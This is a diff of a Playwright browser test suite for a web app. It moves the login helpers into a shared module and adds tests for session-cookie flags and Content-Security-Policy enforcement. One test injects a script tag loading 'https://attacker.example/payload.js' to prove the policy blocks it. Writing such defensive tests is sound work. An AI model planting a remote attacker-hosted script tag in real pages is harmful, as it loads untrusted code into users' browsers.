@@ -15,110 +15,7 @@
  */
 
 import { test, expect, Page } from "@playwright/test";
-
-const ADMIN_USER = "admin";
-const ADMIN_PASS = "adminpass123";
-const PM_USER = "pmuser";
-const PM_PASS = "pmpass1234";
-
-async function setupIfNeeded(page: Page) {
-  // Setup state is an API fact, not a rendering fact. On a cold first boot the
-  // root page can still be rendering its loading state when page.goto() returns,
-  // so reading body text here races the setup-status request made by the app.
-  // Ask the same backend endpoint that spec 01 asserts instead.
-  const statusResponse = await page.request.get("/v1/setup/status");
-  expect(statusResponse.status()).toBe(200);
-  const status = await statusResponse.json();
-  if (status.setup_complete) return;
-
-  await page.goto("/");
-
-  // Setup.tsx's non-PM-POC wizard is five steps:
-  //   ["Hive", "Hardware", "Accounts", "Modules", "Confirm"]
-  // Wait for the first wizard control so a slow cold render cannot race the
-  // setup flow after the backend has already told us setup is required.
-  const conductorName = page.locator('input[placeholder="Hive Conductor"]');
-  await conductorName.waitFor({ state: "visible", timeout: 15000 });
-
-  // 1/5 — Hive
-  await conductorName.fill("PM Test Hive");
-  await page.locator("button", { hasText: /next/i }).click();
-
-  // 2/5 — Hardware
-  await page.locator("text=Beast").first().click();
-  await page.locator("button", { hasText: /next/i }).click();
-
-  // 3/5 — Accounts. These are the same credentials loginAsPM() logs in with
-  // below, so the accounts this creates are the ones the rest of the suite
-  // depends on. Both password fields share placeholder="password" (admin
-  // card first, daily-user card second), hence nth() rather than placeholder.
-  await page.locator('input[placeholder="admin"]').fill(ADMIN_USER);
-  await page.locator('input[type="password"]').nth(0).fill(ADMIN_PASS);
-  await page.locator('input[placeholder="username"]').fill(PM_USER);
-  await page.locator('input[type="password"]').nth(1).fill(PM_PASS);
-  await page.locator("button", { hasText: /next/i }).click();
-
-  // 4/5 — Modules (skip)
-  await page.locator("button", { hasText: /next/i }).click();
-
-  // 5/5 — Confirm. Wait for the POST itself to land, not for a URL change.
-  // Do not swallow a missing/failed response: this helper is the setup gate for
-  // every test, so provisioning failure must fail here rather than leak into a
-  // downstream assertion or authentication error.
-  const [completeResponse] = await Promise.all([
-    page.waitForResponse(
-      (r) => r.url().includes("/v1/setup/complete") && r.request().method() === "POST",
-      { timeout: 15000 },
-    ),
-    page.locator("button", { hasText: /launch/i }).click(),
-  ]);
-  expect(completeResponse.status()).toBe(200);
-  const complete = await completeResponse.json();
-  expect(complete.setup_complete).toBe(true);
-}
-
-// Login.tsx's inputs carry NO `name` and no user-ish placeholder — they are
-// identified by autocomplete tokens:
-//   login mode     -> autocomplete="username" + autocomplete="current-password"
-//   register mode  -> autocomplete="username" + two autocomplete="new-password"
-//                     (password, then confirm)
-// The previous selectors here were 'input[name="username"], input[placeholder*="user"]',
-// which match nothing in either mode. That is why specs 02-12 each hung for the
-// full test timeout inside this helper rather than failing on an assertion.
-//
-// Mode is detected from the form itself rather than from body text: the login
-// view also renders a "Register" toggle, so a body.includes("Register") check
-// takes the register branch while sitting on the login form.
-async function loginAsPM(page: Page) {
-  await page.goto("/login");
-
-  const usernameInput = page.locator('input[autocomplete="username"]').first();
-  const passwordInput = page.locator('input[autocomplete="current-password"]').first();
-
-  // The PM account is created by the setup wizard (setupIfNeeded fills the
-  // Accounts step with these same constants), so this only ever needs to log
-  // in — there is no register path to fall back to.
-  await usernameInput.waitFor({ state: "visible" });
-  await usernameInput.fill(PM_USER);
-  await passwordInput.fill(PM_PASS);
-
-  // Submit by type, NOT by text. Login.tsx renders two mode-TOGGLE buttons
-  // labelled "Sign in" / "Sign up" above the form, and the real submit button
-  // reads "enter the hive" (only "sign in" in PM-POC mode). The previous
-  // selector, hasText: /log.?in|sign.?in/i, therefore matched the *toggle*:
-  // it clicked it, switched to the mode it was already in, submitted nothing,
-  // and reported no error.
-  //
-  // Awaiting the response rather than a fixed timeout means a login that stops
-  // working fails here, loudly, instead of leaking into a downstream 401.
-  await Promise.all([
-    page.waitForResponse(
-      (r) => r.url().includes("/v1/auth/login") && r.request().method() === "POST",
-      { timeout: 15000 },
-    ),
-    page.locator('form button[type="submit"]').click(),
-  ]);
-}
+import { PM_PASS, loginAsPM, setupIfNeeded } from "./session";
 
 async function elevateDagWrites(page: Page, taskId: string) {
   // DAG creation/runs and optimizer mutations are protected operations. The
@@ -281,5 +178,139 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
       const body = await page.textContent("body");
       expect(body?.length).toBeGreaterThan(0);
     }
+  });
+
+  // #369's "Browser E2E verifies effective cookie attributes". These assert
+  // what a real Chromium actually stored, not what the server said to store —
+  // a `Set-Cookie` a browser rejects or rewrites looks identical in a unit
+  // test.
+  //
+  // `Secure` is deliberately NOT asserted here, and its absence is not a gap.
+  // This harness serves plain HTTP and declares itself a local-development
+  // context (docker-compose.test.yml), so the cookie is correctly not Secure
+  // in it. Its browser-level effect was demonstrated the hard way: turning the
+  // default on without declaring the harness made Chromium drop the cookie and
+  // seven of the tests above fail with 401 immediately after a successful
+  // login. Asserting `secure === false` here would pin the harness's waiver
+  // rather than the product's default, which is the wrong thing to hold still.
+  test("13 — the session cookie a browser stores is HttpOnly and scoped", async ({
+    page,
+    context,
+  }) => {
+    await loginAsPM(page);
+
+    const cookies = await context.cookies();
+    const session = cookies.find((c) => c.name === "hive_session");
+    expect(session, "no hive_session cookie was stored after login").toBeTruthy();
+
+    // HttpOnly: script cannot read it, so an XSS cannot exfiltrate the session.
+    expect(session!.httpOnly).toBe(true);
+    // Scoped to the whole app rather than inherited from the login route's path.
+    expect(session!.path).toBe("/");
+    // Lax: rides a top-level navigation (an emailed link works) but not a
+    // cross-site subrequest.
+    expect(session!.sameSite).toBe("Lax");
+    // Bounded lifetime. A cookie with no expiry lives as long as the browser
+    // process, which on a machine that is never rebooted is indefinitely —
+    // Playwright reports that case as -1.
+    expect(session!.expires).toBeGreaterThan(0);
+  });
+
+  test("14 — the session cookie is not readable from JavaScript", async ({ page }) => {
+    // The property HttpOnly exists for, asserted from inside the page rather
+    // than from the cookie jar: the flag being set and the value being
+    // unreachable are different claims, and only the second one matters.
+    await loginAsPM(page);
+
+    const visible = await page.evaluate(() => document.cookie);
+    expect(visible).not.toContain("hive_session");
+  });
+
+  // #310. The backend tests prove the header is sent and say what is in it.
+  // Only a browser proves it is *enforced*: a policy with a typo, a directive
+  // this Chromium does not implement, or a header a proxy rewrote all look
+  // identical to a unit test reading the string the server produced.
+  //
+  // This harness declares itself a local-development context (see the compose
+  // file), so what Chromium receives here is the *development* policy. The two
+  // ways it differs — the Vite origins in `connect-src`, and no
+  // `upgrade-insecure-requests` — are named in `services/csp_policy.py`, and
+  // neither touches the assertions below. `upgrade-insecure-requests` is in
+  // fact the reason the harness needs the dev policy at all: on plain HTTP it
+  // would rewrite every request to a port nothing is listening on.
+  test("15 — the Content-Security-Policy arrives on the document", async ({ page }) => {
+    const response = await page.goto("/");
+    const policy = response?.headers()["content-security-policy"];
+
+    expect(policy, "no CSP on the document response").toBeTruthy();
+    // The two that matter most for an injected-markup attack, checked as text
+    // because a browser that ignored the whole header would still let the
+    // assertions below about behaviour pass for unrelated reasons.
+    expect(policy).toContain("script-src 'self'");
+    expect(policy).toContain("object-src 'none'");
+    expect(policy).not.toContain("'unsafe-inline'");
+    expect(policy).not.toContain("'unsafe-eval'");
+  });
+
+  test("15b — Chromium refuses an injected inline script", async ({ page }) => {
+    // The fixture is the attack this header exists to contain: markup that
+    // reaches the DOM and tries to run. It is injected from a trusted context
+    // here, which is *stronger* than injecting it through a real sink — if the
+    // policy stops script we planted ourselves, it stops script an attacker
+    // plants.
+    await page.goto("/");
+
+    const violations: string[] = [];
+    page.on("console", (message) => {
+      if (message.type() === "error" && /Content Security Policy/i.test(message.text())) {
+        violations.push(message.text());
+      }
+    });
+
+    const executed = await page.evaluate(() => {
+      (window as unknown as Record<string, unknown>).__csp_probe__ = false;
+      const script = document.createElement("script");
+      script.textContent = "window.__csp_probe__ = true;";
+      document.body.appendChild(script);
+      return (window as unknown as Record<string, unknown>).__csp_probe__ === true;
+    });
+
+    expect(executed, "an inline <script> ran despite script-src 'self'").toBe(false);
+    expect(violations.length, "no CSP violation was reported").toBeGreaterThan(0);
+  });
+
+  test("15c — Chromium refuses a cross-origin script before it reaches the network", async ({
+    page,
+  }) => {
+    // The exfiltration half. Asserting "it did not load" would be vacuous in
+    // this harness — the container resolves no external DNS, so a
+    // cross-origin fetch fails whether or not a CSP exists. What distinguishes
+    // the two is *when*: a CSP refusal happens before any network attempt and
+    // says so, so the violation report is the evidence and the load result is
+    // not.
+    await page.goto("/");
+
+    const refusals: string[] = [];
+    page.on("console", (message) => {
+      if (/Refused to load the script/i.test(message.text())) {
+        refusals.push(message.text());
+      }
+    });
+
+    await page.evaluate(async () => {
+      await new Promise<void>((resolve) => {
+        const script = document.createElement("script");
+        script.src = "https://attacker.example/payload.js";
+        script.onload = () => resolve();
+        script.onerror = () => resolve();
+        document.body.appendChild(script);
+        setTimeout(resolve, 3000);
+      });
+    });
+
+    expect(
+      refusals.join("\n"),
+      "no CSP refusal for a cross-origin script — the policy is not being enforced",
+    ).toContain("attacker.example");
   });
 });
